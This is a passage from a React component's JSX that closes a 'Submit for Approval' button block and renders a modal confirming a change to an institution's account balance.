                        'Submit for Approval'
                      )}
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Balance Confirmation Modal */}
      {showBalanceConfirm && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[70] p-6">
          <div className="bg-white rounded-3xl p-8 max-w-md w-full">
            <h3 className="text-xl font-semibold mb-4">Confirm Balance Update</h3>
            <p className="text-slate-600 mb-6">
              Change balance for <strong>{showBalanceConfirm.institution}</strong> from{" "}
              <strong>{formatCurrency(showBalanceConfirm.oldBalance)}</strong> to{" "}
              <strong>{formatCurrency(showBalanceConfirm.newBalance)}</strong>?
            </p>
            <div className="flex gap-3">
              <button onClick={() => setShowBalanceConfirm(null)} className="flex-1 py-3 rounded-2xl border">Cancel</button>
              <button onClick={confirmBalanceUpdate} className="flex-1 py-3 rounded-2xl bg-teal-600 text-white font-semibold">Confirm Update</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}